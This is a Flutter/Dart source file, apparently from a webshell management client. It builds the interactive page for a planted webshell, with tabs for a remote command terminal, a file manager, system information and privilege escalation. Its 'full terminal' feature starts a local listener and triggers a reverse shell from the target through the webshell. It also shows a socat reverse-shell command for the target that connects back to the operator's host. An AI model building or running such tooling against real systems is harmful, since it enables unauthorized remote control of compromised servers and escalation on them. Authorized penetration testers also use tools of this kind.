import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:async';

import '../models/webshell.dart';
import '../services/reverse_shell_service.dart';
import '../services/webshell_service.dart';
import '../theme/app_theme.dart';
import '../utils/matrix_console_log.dart';
import '../app/localization.dart';
import 'reverse_shell_terminal_page.dart';
import 'webshell_interactive_file_manager.dart';
import 'webshell_interactive_system_priv_esc.dart';
import 'webshell_interactive_terminal_shared.dart';

// ─── 主页面 ───────────────────────────────────────────────────────────────────

class WebshellInteractivePage extends StatefulWidget {
  final Webshell webshell;

  const WebshellInteractivePage({super.key, required this.webshell});

  @override
  State<WebshellInteractivePage> createState() =>
      _WebshellInteractivePageState();
}

class _WebshellInteractivePageState extends State<WebshellInteractivePage>
    with SingleTickerProviderStateMixin {
  late final WebshellService _service;
  late final TabController _tabController;
  late final TabCompleter _completer;
  bool _isConnected = false;
  bool _isChecking = true;
  String? _lastPingError;

  @override
  void initState() {
    super.initState();
    _service = WebshellService(widget.webshell);
    _tabController = TabController(length: 4, vsync: this);
    _completer = TabCompleter(_service);
    _checkConnection();
  }

  static const _kPingFallbackTag = '__MATRIX_PING_FALLBACK_OK__';

  Future<void> _checkConnection() async {
    setState(() => _isChecking = true);
    var alive = false;
    var pingLogPrinted = false;
    try {
      alive = await _service.ping();
    } catch (e, st) {
      alive = false;
      pingLogPrinted = true;
      matrixConsoleLog(
        '[ping] ok=false type=${widget.webshell.connectorType} '
        'url=${widget.webshell.url} err=$e',
      );
      debugPrint('[ping] stack: $st');
    }
    if (!alive && !pingLogPrinted) {
      matrixConsoleLog(
        '[ping] ok=false type=${widget.webshell.connectorType} '
        'url=${widget.webshell.url}',
      );
    }
    if (!alive && _service.supportsShellExec) {
      // 某些目标会拦截/重定向 ping 动作，但命令执行通道仍可用。
      try {
        final probe = await _service
            .executeCommand('echo $_kPingFallbackTag')
            .timeout(const Duration(seconds: 8));
        if (probe.contains(_kPingFallbackTag)) {
          alive = true;
          matrixConsoleLog(
            '[ping] ok=true type=${widget.webshell.connectorType} '
            'url=${widget.webshell.url} via=exec_fallback',
          );
        }
      } catch (_) {
        // 回退探测失败时保持原始 ping 结果。
      }
    }
    if (!alive) {
      final diag = _service.lastPingDiagnostic;
      if (diag != null && diag.isNotEmpty) {
        debugPrint('[ping] diagnostic:\n$diag');
      }
    }
    if (mounted) {
      setState(() {
        _isConnected = alive;
        _isChecking = false;
        _lastPingError = alive ? null : S.pingFailHint;
      });
    }
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      body: Column(
        children: [
          _buildHeader(),
          _buildTabBar(),
          Expanded(
            child: Column(
              children: [
                if (_isChecking)
                  LinearProgressIndicator(
                    backgroundColor: AppColors.bgCard,
                    color: AppColors.primary.withValues(alpha: 0.5),
                    minHeight: 2,
                  )
                else if (!_isConnected)
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(
                      horizontal: 16,
                      vertical: 8,
                    ),
                    color: AppColors.red.withValues(alpha: 0.08),
                    child: Row(
                      children: [
                        const Icon(
                          Icons.warning_amber_rounded,
                          color: AppColors.red,
                          size: 15,
                        ),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            _lastPingError != null && _lastPingError!.isNotEmpty
                                ? _lastPingError!
                                : S.connectionFailed,
                            style: AppTextStyles.caption(
                              color: AppColors.red,
                              size: 12,
                            ),
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: _checkConnection,
                          child: Text(
                            S.btnRetry,
                            style: AppTextStyles.caption(
                              color: AppColors.primary,
                              size: 12,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                Expanded(
                  child: AnimatedBuilder(
                    animation: _tabController,
                    builder: (context, _) {
                      return TabBarView(
                        controller: _tabController,
                        physics: const NeverScrollableScrollPhysics(),
                        children: [
                          FocusScope(
                            skipTraversal: _tabController.index != 0,
                            child: _TerminalTab(
                              service: _service,
                              completer: _completer,
                            ),
                          ),
                          FocusScope(
                            skipTraversal: _tabController.index != 1,
                            child: FileManagerTab(
                              service: _service,
                              onInvalidateCompleterDir:
                                  _completer.invalidateDir,
                            ),
                          ),
                          FocusScope(
                            skipTraversal: _tabController.index != 2,
                            child: SystemInfoTab(service: _service),
                          ),
                          FocusScope(
                            skipTraversal: _tabController.index != 3,
                            child: PrivEscTab(service: _service),
                          ),
                        ],
                      );
                    },
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      height: 56,
      padding: const EdgeInsets.symmetric(horizontal: 12),
      decoration: BoxDecoration(
        color: AppColors.bgElevated,
        border: Border(
          bottom: BorderSide(color: AppColors.primary.withValues(alpha: 0.35)),
        ),
      ),
      child: Row(
        children: [
          IconButton(
            onPressed: () => Navigator.pop(context),
            icon: const Icon(
              Icons.arrow_back_ios_new,
              color: AppColors.textSecondary,
              size: 17,
            ),
            tooltip: S.tooltipBack,
          ),
          const SizedBox(width: 4),
          // Status dot
          AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            width: 9,
            height: 9,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _isChecking
                  ? AppColors.amber
                  : _isConnected
                  ? AppColors.primary
                  : AppColors.red,
              boxShadow: (!_isChecking && _isConnected)
                  ? [
                      BoxShadow(
                        color: AppColors.primary.withValues(alpha: 0.7),
                        blurRadius: 8,
                      ),
                    ]
                  : null,
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  widget.webshell.name,
                  style: AppTextStyles.body(
                    size: 14,
                    color: AppColors.textPrimary,
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
                Text(
                  widget.webshell.url,
                  style: AppTextStyles.caption(size: 11, color: AppColors.cyan),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          if (_isChecking)
            const SizedBox(
              width: 16,
              height: 16,
              child: CircularProgressIndicator(
                strokeWidth: 2,
                color: AppColors.amber,
              ),
            ),
          const SizedBox(width: 4),
          TextButton.icon(
            onPressed: _isChecking ? null : _checkConnection,
            icon: const Icon(Icons.wifi_tethering_rounded, size: 15),
            label: Text(
              _isChecking
                  ? S.statusChecking
                  : _isConnected
                  ? S.statusConnected
                  : S.statusReconnect,
            ),
            style: TextButton.styleFrom(
              foregroundColor: _isConnected
                  ? AppColors.primary
                  : AppColors.textSecondary,
              padding: const EdgeInsets.symmetric(horizontal: 8),
            ),
          ),
          const SizedBox(width: 4),
          _methodBadge(widget.webshell.method),
          const SizedBox(width: 8),
        ],
      ),
    );
  }

  Widget _methodBadge(String method) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
        color: AppColors.border,
        borderRadius: BorderRadius.circular(4),
        border: Border.all(
          color: method == 'POST'
              ? AppColors.cyan.withValues(alpha: 0.5)
              : AppColors.amber.withValues(alpha: 0.5),
        ),
      ),
      child: Text(
        method,
        style: AppTextStyles.caption(
          size: 11,
          color: method == 'POST' ? AppColors.cyan : AppColors.amber,
        ),
      ),
    );
  }

  Widget _buildTabBar() {
    return Container(
      color: AppColors.bgElevated,
      child: TabBar(
        controller: _tabController,
        isScrollable: true,
        tabAlignment: TabAlignment.start,
        indicatorColor: AppColors.primary,
        indicatorWeight: 2,
        labelColor: AppColors.primary,
        unselectedLabelColor: AppColors.textSecondary,
        labelStyle: AppTextStyles.body(size: 13),
        tabs: [
          Tab(icon: const Icon(Icons.terminal, size: 15), text: S.tabTerminal),
          Tab(
            icon: const Icon(Icons.folder_open_outlined, size: 15),
            text: S.tabFileManager,
          ),
          Tab(
            icon: const Icon(Icons.dns_outlined, size: 15),
            text: S.tabSysInfo,
          ),
          Tab(
            icon: const Icon(Icons.shield_outlined, size: 15),
            text: S.sectionPrivEsc,
          ),
        ],
      ),
    );
  }
}

class _TerminalTab extends StatefulWidget {
  final WebshellService service;
  final TabCompleter completer;

  const _TerminalTab({required this.service, required this.completer});

  @override
  State<_TerminalTab> createState() => _TerminalTabState();
}

class _TerminalTabState extends State<_TerminalTab>
    with AutomaticKeepAliveClientMixin {
  final _inputController = TextEditingController();
  final _scrollController = ScrollController();
  final _inputFocus = FocusNode();
  final List<TerminalEntry> _entries = [];
  final List<String> _history = [];
  int _historyIndex = -1;
  bool _executing = false;

  /// false = 分离式（输出区 + 底部输入栏）
  /// true  = 一体式（输入嵌入输出流末尾，模拟真实终端）
  bool _integratedMode = false;
  String _currentDir = '~';

  late final TabCompleter _completer;
  // Tab 补全正在写入文本时设为 true，避免 onChanged 重置补全状态
  bool _tabbing = false;
  DateTime? _lastTabAt;
  bool _lastTabWasDouble = false;
  OverlayEntry? _completionOverlay;
  Timer? _completionOverlayTimer;

  @override
  bool get wantKeepAlive => true;

  @override
  void initState() {
    super.initState();
    _completer = widget.completer;
    _initDir();
  }

  Future<void> _initDir() async {
    final dir = await widget.service.getCurrentDir();
    if (mounted) setState(() => _currentDir = dir);
    // 并发预热：目录列表、环境变量、HOME、可用命令（同时发出）
    _completer.warmDir(dir);
    _completer.fetchEnvVars();
    _completer.fetchHomeDir();
    _completer.fetchAvailableCommands(dir);
  }

  Future<void> _execute(String raw) async {
    final cmd = raw.trim();
    if (cmd.isEmpty) return;

    _completer.reset();

    // 本地内置命令
    if (cmd == 'clear' || cmd == 'cls') {
      setState(() => _entries.clear());
      _inputController.clear();
      return;
    }

    // 加入历史
    if (_history.isEmpty || _history.last != cmd) _history.add(cmd);
    _historyIndex = -1;

    final entry = TerminalEntry(
      command: cmd,
      dir: _currentDir,
      timestamp: DateTime.now(),
    );
    setState(() {
      _entries.add(entry);
      _executing = true;
    });
    _inputController.clear();
    // 不立即跳转：entry 停在视口外下方，等输出返回后一起滑入

    // cd 命令追加 marker+pwd，单次请求同时获取新目录，不再额外发网络请求
    const cwdMarker = '__MATRIX_CWD__';
    final isCd = cmd == 'cd' || cmd.startsWith('cd ') || cmd.startsWith('cd\t');
    final sendCmd = isCd ? "$cmd 2>&1; echo '$cwdMarker'; pwd" : cmd;

    final execResult = await widget.service.executeCommand(
      sendCmd,
      workingDir: _currentDir,
    );

    // 解析 cd 后的新目录
    String output = execResult;
    if (isCd) {
      const sep = '$cwdMarker\n';
      final idx = execResult.lastIndexOf(sep);
      if (idx >= 0) {
        output = execResult.substring(0, idx).trim();
        final newDir = execResult.substring(idx + sep.length).trim();
        if (newDir.isNotEmpty && mounted) {
          final prevDir = _currentDir;
          setState(() => _currentDir = newDir);
          // cd 后使旧目录缓存失效（旧目录内可能有文件变动）
          _completer.invalidateDir(prevDir);
          _completer.warmDir(newDir);
        }
      }
    }

    if (mounted) {
      setState(() {
        entry.output = output.isEmpty ? S.noOutput : output;
        _executing = false;
      });
      // 命令执行后使当前目录缓存失效，确保 touch/mkdir/rm 等操作能被 Tab 补全识别
      _completer.invalidateDir(_currentDir);
      _scrollToBottom(animated: true); // 平滑滚动到最新输出
      // 执行完毕后恢复焦点
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted) _inputFocus.requestFocus();
      });
    }
  }

  /// [animated] = false → 立即跳转（提交命令时）
  /// [animated] = true  → 平滑滚动（输出返回后）
  void _scrollToBottom({bool animated = false}) {
    if (!animated) {
      // 单帧后立即跳转即可
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted || !_scrollController.hasClients) return;
        _scrollController.jumpTo(_scrollController.position.maxScrollExtent);
      });
      return;
    }
    // 等两帧：第一帧完成布局，第二帧 maxScrollExtent 才是最终值
    WidgetsBinding.instance.addPostFrameCallback((_) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted || !_scrollController.hasClients) return;
        final target = _scrollController.position.maxScrollExtent;
        final distance = (target - _scrollController.position.pixels).abs();
        // 距离越短给越多时间（保证动画可见），距离越长按比例但限制上限
        // 每像素 1.2ms，最短 450ms（短输出时明显可见），最长 750ms
        final ms = (distance * 1.2).clamp(450.0, 750.0).toInt();
        _scrollController.animateTo(
          target,
          duration: Duration(milliseconds: ms),
          curve: Curves.easeOutCubic,
        );
      });
    });
  }

  void _navigateHistory(bool up) {
    if (_history.isEmpty) return;
    _completer.reset();
    setState(() {
      if (up) {
        _historyIndex = (_historyIndex + 1).clamp(0, _history.length - 1);
      } else {
        _historyIndex = _historyIndex - 1;
      }
    });
    if (_historyIndex >= 0 && _historyIndex < _history.length) {
      final cmd = _history[_history.length - 1 - _historyIndex];
      _inputController.text = cmd;
      _inputController.selection = TextSelection.collapsed(offset: cmd.length);
    } else {
      _historyIndex = -1;
      _inputController.clear();
    }
  }

  @override
  Widget build(BuildContext context) {
    super.build(context);
    return Column(
      children: [
        // ── 工具栏 ──────────────────────────────────────────────
        Container(
          height: 36,
          padding: const EdgeInsets.symmetric(horizontal: 12),
          decoration: const BoxDecoration(
            color: AppColors.bgElevated,
            border: Border(bottom: BorderSide(color: AppColors.border)),
          ),
          child: Row(
            children: [
              const Icon(Icons.terminal, size: 13, color: AppColors.primary),
              const SizedBox(width: 6),
              Expanded(
                child: Text(
                  _currentDir,
                  style: AppTextStyles.caption(size: 11, color: AppColors.cyan),
                  overflow: TextOverflow.ellipsis,
                ),
              ),
              if (_entries.isNotEmpty)
                _toolbarBtn(
                  icon: Icons.delete_sweep_outlined,
                  tooltip: S.tooltipClearTerminal,
                  onTap: () => setState(() => _entries.clear()),
                ),
              const SizedBox(width: 6),
              // 完整终端（反弹 Shell）按钮
              _toolbarBtn(
                icon: Icons.open_in_new,
                tooltip: S.tooltipFullTerminal,
                onTap: _showReverseShellDialog,
              ),
              const SizedBox(width: 6),
              // 模式切换按钮
              ModeToggle(
                integrated: _integratedMode,
                onToggle: () {
                  setState(() => _integratedMode = !_integratedMode);
                  // 切换后把焦点给回输入框
                  WidgetsBinding.instance.addPostFrameCallback((_) {
                    if (mounted) _inputFocus.requestFocus();
                  });
                },
              ),
            ],
          ),
        ),
        // ── 内容区 ───────────────────────────────────────────────
        Expanded(
          child: _integratedMode
              ? _buildIntegratedLayout()
              : _buildSeparateLayout(),
        ),
      ],
    );
  }

  Future<void> _showReverseShellDialog() async {
    // 选择完整终端方案
    final mode = await showDialog<String>(
      context: context,
      builder: (context) {
        String selected = 'script';
        return StatefulBuilder(
          builder: (context, setState) {
            return AlertDialog(
              title: Text(S.titleSelectTerminalMode),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  RadioListTile<String>(
                    value: 'script',
                    groupValue: selected,
                    onChanged: (v) => setState(() => selected = v!),
                    title: Text(S.terminalModeScript),
                    subtitle: Text(
                      S.terminalModeScriptDesc,
                      style: const TextStyle(fontSize: 11),
                    ),
                  ),
                  RadioListTile<String>(
                    value: 'bash',
                    groupValue: selected,
                    onChanged: (v) => setState(() => selected = v!),
                    title: Text(S.terminalModeBash),
                    subtitle: Text(
                      S.terminalModeBashDesc,
                      style: const TextStyle(fontSize: 11),
                    ),
                  ),
                  RadioListTile<String>(
                    value: 'socat',
                    groupValue: selected,
                    onChanged: (v) => setState(() => selected = v!),
                    title: Text(S.terminalModeSocat),
                    subtitle: Text(
                      S.terminalModeSocatDesc,
                      style: const TextStyle(fontSize: 11),
                    ),
                  ),
                ],
              ),
              actions: [
                TextButton(
                  onPressed: () => Navigator.of(context).pop(null),
                  child: Text(S.btnCancel),
                ),
                FilledButton(
                  onPressed: () => Navigator.of(context).pop(selected),
                  child: Text(S.btnConfirm),
                ),
              ],
            );
          },
        );
      },
    );

    if (mode == null) return;

    final rs = ReverseShellService();

    if (mode == 'script' || mode == 'bash') {
      // 内置反弹：通过当前 Webshell 的连接器发送一次反弹命令
      // 具体使用 script 还是 bash 由各自连接器的 startReverseShell 实现决定。
      final nav = Navigator.of(context);
      final label = widget.service.webshell.name;
      rs.onSession = (session) {
        session.label = label;
        if (!mounted) return;
        nav.push(
          MaterialPageRoute(
            builder: (_) => ReverseShellTerminalPage(session: session),
          ),
        );
      };

      try {
        await rs.loadConfig();
        await rs.startListening(port: rs.lport);
        // 只调用一次 startReverseShell，并通过 preferScript 区分 script/bash 方案。
        await widget.service.startReverseShell(
          rs.lhost,
          rs.lport,
          preferScript: mode == 'script',
        );

        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              S.snackReverseShellSent,
              style: const TextStyle(color: Colors.white),
            ),
            backgroundColor: Color(0xFF064D2E), // 暗绿色背景
            behavior: SnackBarBehavior.floating,
          ),
        );
      } catch (e) {
        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              S.snackStartFailed(e),
              style: const TextStyle(color: Colors.white),
            ),
            backgroundColor: AppColors.red,
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
      return;
    }

    if (mode == 'socat') {
      // socat 模式：仅启动本地监听，并给出在目标上执行的 socat 命令
      final nav = Navigator.of(context);
      rs.onSession = (session) {
        if (!mounted) return;
        nav.push(
          MaterialPageRoute(
            builder: (_) => ReverseShellTerminalPage(session: session),
          ),
        );
      };
      try {
        await rs.loadConfig();
        await rs.startListening(port: rs.lport);
      } catch (e) {
        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              S.snackListenFailed(e),
              style: const TextStyle(color: Colors.white),
            ),
            backgroundColor: AppColors.red,
            behavior: SnackBarBehavior.floating,
          ),
        );
        return;
      }

      final cmd =
          'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';

      if (!mounted) return;
      await showDialog<void>(
        context: context,
        builder: (context) {
          return AlertDialog(
            title: Text(S.titleSocatCommand),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  S.socatInstructions,
                  style: AppTextStyles.caption(
                    size: 12,
                    color: AppColors.textSecondary,
                  ),
                ),
                const SizedBox(height: 8),
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: AppColors.bgDark,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: AppColors.border),
                  ),
                  child: SelectableText(
                    cmd,
                    style: AppTextStyles.terminal(
                      size: 12,
                      color: AppColors.cyan,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  S.socatTips(rs.lport),
                  style: AppTextStyles.caption(
                    size: 11,
                    color: AppColors.textMuted,
                  ),
                ),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.of(context).pop(),
                child: Text(S.btnClose),
              ),
            ],
          );
        },
      );
    }
  }

  // ── 模式A：分离式（输出区 + 底部输入栏）────────────────────────────────
  Widget _buildSeparateLayout() {
    const bgColor = Color(0xFF0D1117);
    const fadeHeight = 90.0;

    return Stack(
      children: [
        // ① 输出区 —— ShaderMask 底部渐隐（纯 CPU/Skia，无 GPU 合成开销）
        Positioned.fill(
          child: ShaderMask(
            shaderCallback: (rect) => LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: const [Colors.white, Colors.white, Colors.transparent],
              stops: [
                0.0,
                (1.0 - fadeHeight / rect.height).clamp(0.0, 0.8),
                1.0,
              ],
            ).createShader(rect),
            blendMode: BlendMode.dstIn,
            child: _buildOutputList(embedded: false),
          ),
        ),

        // ② 背景色填充渐变（替代 BackdropFilter，零 GPU 额外开销）
        Positioned(
          left: 0,
          right: 0,
          bottom: 0,
          height: fadeHeight,
          child: IgnorePointer(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    bgColor.withValues(alpha: 0.0),
                    bgColor.withValues(alpha: 0.7),
                    bgColor,
                  ],
                  stops: const [0.0, 0.5, 1.0],
                ),
              ),
            ),
          ),
        ),

        // ③ 悬浮输入框 —— 垂直居中于渐隐区 (90 - 46) / 2 = 22
        Positioned(
          left: 16,
          right: 16,
          bottom: (fadeHeight - 46) / 2,
          child: _buildFloatingInputBar(),
        ),
      ],
    );
  }

  Widget _buildFloatingInputBar() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 13),
      decoration: BoxDecoration(
        color: AppColors.bgElevated,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: AppColors.primary.withValues(alpha: 0.45)),
        boxShadow: [
          BoxShadow(
            color: AppColors.primary.withValues(alpha: 0.12),
            blurRadius: 20,
            spreadRadius: 0,
            offset: const Offset(0, 4),
          ),
          BoxShadow(
            color: Colors.black.withValues(alpha: 0.5),
            blurRadius: 16,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          Text(
            '$_currentDir\$ ',
            style: AppTextStyles.terminal(size: 13, color: AppColors.primary),
          ),
          Expanded(child: _buildInputField()),
          // 执行进度仅在输出区末尾显示一条“执行中...”行，避免这里重复小进度条
        ],
      ),
    );
  }

  // ── 模式B：一体式（输入嵌入输出流末尾）──────────────────────────────────
  Widget _buildIntegratedLayout() {
    return _buildOutputList(embedded: true);
  }

  // ── 共用输出列表（embedded=true 时在末尾追加输入行）────────────────────
  Widget _buildOutputList({required bool embedded}) {
    final int extraItems = embedded ? 1 : (_executing ? 1 : 0);

    // 一体式空状态：直接显示空内容 + 输入行，不显示居中提示
    if (!embedded && _entries.isEmpty && !_executing) {
      return Container(
        color: const Color(0xFF0D1117),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.terminal, color: AppColors.primary, size: 48),
              const SizedBox(height: 16),
              Text(
                S.terminalEmptyHint,
                style: AppTextStyles.terminal(
                  size: 14,
                  color: AppColors.textMuted,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                S.terminalKeyHint,
                style: AppTextStyles.caption(
                  size: 12,
                  color: AppColors.textMuted,
                ),
              ),
            ],
          ),
        ),
      );
    }

    return Container(
      color: const Color(0xFF0D1117),
      child: ListView.builder(
        controller: _scrollController,
        // 分离式：底部留出渐变遮罩高度，确保最后一条记录可滚出遮挡区
        padding: EdgeInsets.fromLTRB(16, 16, 16, embedded ? 12 : 100),
        itemCount: _entries.length + extraItems,
        itemBuilder: (context, i) {
          // 历史条目
          if (i < _entries.length) return EntryBlock(entry: _entries[i]);

          // 分离式：执行中的 loading 条目
          if (!embedded && _executing) return _buildLoadingRow();

          // 一体式：最后一行（执行中 or 输入行）
          if (_executing) return _buildLoadingRow();
          return _buildEmbeddedInputRow();
        },
      ),
    );
  }

  Widget _buildLoadingRow() {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Row(
        children: [
          const SizedBox(
            width: 13,
            height: 13,
            child: CircularProgressIndicator(
              strokeWidth: 1.5,
              color: AppColors.primary,
            ),
          ),
          const SizedBox(width: 10),
          Text(
            S.executing,
            style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
          ),
        ],
      ),
    );
  }

  // 一体式模式下嵌入在列表末尾的输入行
  Widget _buildEmbeddedInputRow() {
    return Padding(
      padding: const EdgeInsets.only(top: 2, bottom: 8),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Text(
            '$_currentDir\$ ',
            style: AppTextStyles.terminal(size: 13, color: AppColors.primary),
          ),
          Expanded(child: _buildInputField()),
        ],
      ),
    );
  }

  // 两种模式共用的 TextField（样式/逻辑完全一致）
  Widget _buildInputField() {
    return Focus(
      onKeyEvent: (node, event) {
        if (event is KeyDownEvent) {
          if (event.logicalKey == LogicalKeyboardKey.arrowUp) {
            _navigateHistory(true);
            return KeyEventResult.handled;
          }
          if (event.logicalKey == LogicalKeyboardKey.arrowDown) {
            _navigateHistory(false);
            return KeyEventResult.handled;
          }
          if (event.logicalKey == LogicalKeyboardKey.tab) {
            _doTabComplete();
            return KeyEventResult.handled;
          }
        }
        return KeyEventResult.ignored;
      },
      child: TextField(
        controller: _inputController,
        focusNode: _inputFocus,
        autofocus: true,
        enabled: !_executing,
        style: const TextStyle(
          color: AppColors.textPrimary,
          fontFamily: 'Monaco',
          fontFamilyFallback: ['Courier New', 'Courier', 'monospace'],
          fontSize: 13,
        ),
        decoration: const InputDecoration(
          border: InputBorder.none,
          isDense: true,
          contentPadding: EdgeInsets.zero,
        ),
        onChanged: (_) {
          // 非 Tab 产生的文字变更 → 退出补全循环
          if (!_tabbing) {
            _completer.reset();
            _lastTabWasDouble = false;
          }
        },
        onSubmitted: (v) {
          _execute(v);
          WidgetsBinding.instance.addPostFrameCallback((_) {
            if (mounted) _inputFocus.requestFocus();
          });
        },
      ),
    );
  }

  Future<void> _doTabComplete() async {
    if (_executing) return;
    final now = DateTime.now();
    final isDoubleTabNow =
        _lastTabAt != null &&
        now.difference(_lastTabAt!) <= const Duration(milliseconds: 1200);
    _lastTabAt = now;
    final shouldShowOverlay = isDoubleTabNow && !_lastTabWasDouble;
    _lastTabWasDouble = isDoubleTabNow;

    final newText = await _completer.onTab(_inputController.text, _currentDir);
    if (newText != null && mounted) {
      _tabbing = true;
      _inputController.text = newText;
      _inputController.selection = TextSelection.collapsed(
        offset: newText.length,
      );
      _tabbing = false;
    }
    if (shouldShowOverlay && mounted) {
      _showCompletionCandidates();
    }
  }

  void _showCompletionCandidates() {
    if (!mounted) return;
    final raw = _completer.allMatches;
    final indexed = <(int idx, String text)>[];
    for (var i = 0; i < raw.length; i++) {
      final t = raw[i].trimRight();
      if (t.isNotEmpty) indexed.add((i, t));
    }
    final total = _completer.matchCount;
    _completionOverlay?.remove();
    _completionOverlayTimer?.cancel();

    final List<(int idx, String text)> lines = total == 0
        ? const <(int idx, String text)>[]
        : indexed.take(20).toList(growable: false);
    final hidden = total - lines.length;
    final overlay = Overlay.of(context);
    _completionOverlay = OverlayEntry(
      builder: (_) => Positioned(
        right: 18,
        bottom: 90,
        child: Material(
          color: Colors.transparent,
          child: Container(
            width: 460,
            constraints: const BoxConstraints(maxHeight: 340),
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: AppColors.bgElevated.withValues(alpha: 0.97),
              border: Border.all(
                color: AppColors.primary.withValues(alpha: 0.4),
              ),
              borderRadius: BorderRadius.circular(8),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withValues(alpha: 0.35),
                  blurRadius: 12,
                  offset: const Offset(0, 6),
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Expanded(
                      child: Text(
                        S.tabCompletionTitle(total),
                        style: AppTextStyles.caption(
                          size: 11,
                          color: AppColors.amber,
                        ),
                      ),
                    ),
                    InkWell(
                      onTap: _removeCompletionOverlay,
                      borderRadius: BorderRadius.circular(4),
                      child: const Padding(
                        padding: EdgeInsets.all(2),
                        child: Icon(
                          Icons.close,
                          size: 14,
                          color: AppColors.textSecondary,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                if (total == 0)
                  Text(
                    S.noCompletions,
                    style: AppTextStyles.terminal(
                      size: 12,
                      color: AppColors.textSecondary,
                    ),
                  )
                else
                  Flexible(
                    child: ListView.builder(
                      shrinkWrap: true,
                      itemCount: lines.length,
                      itemBuilder: (context, i) {
                        final item = lines[i];
                        return InkWell(
                          onTap: () => _pickCompletion(item.$1),
                          borderRadius: BorderRadius.circular(6),
                          child: Padding(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 6,
                              vertical: 5,
                            ),
                            child: Text(
                              item.$2,
                              style: AppTextStyles.terminal(
                                size: 12,
                                color: AppColors.cyan,
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        );
                      },
                    ),
                  ),
                if (hidden > 0)
                  Padding(
                    padding: const EdgeInsets.only(top: 6),
                    child: Text(
                      '... +$hidden',
                      style: AppTextStyles.caption(
                        size: 11,
                        color: AppColors.textMuted,
                      ),
                    ),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
    overlay.insert(_completionOverlay!);
    _completionOverlayTimer = Timer(
      const Duration(seconds: 8),
      _removeCompletionOverlay,
    );
  }

  void _pickCompletion(int index) {
    final newText = _completer.applyMatchAt(index);
    if (newText == null || !mounted) return;
    _tabbing = true;
    _inputController.text = newText;
    _inputController.selection = TextSelection.collapsed(
      offset: newText.length,
    );
    _tabbing = false;
    _lastTabWasDouble = false;
    _inputFocus.requestFocus();
    _removeCompletionOverlay();
  }

  void _removeCompletionOverlay() {
    _completionOverlayTimer?.cancel();
    _completionOverlayTimer = null;
    _completionOverlay?.remove();
    _completionOverlay = null;
  }

  Widget _toolbarBtn({
    required IconData icon,
    required String tooltip,
    required VoidCallback onTap,
  }) {
    return Tooltip(
      message: tooltip,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(6),
        child: Padding(
          padding: const EdgeInsets.all(5),
          child: Icon(icon, size: 16, color: AppColors.textSecondary),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _removeCompletionOverlay();
    _inputController.dispose();
    _scrollController.dispose();
    _inputFocus.dispose();
    super.dispose();
  }
}
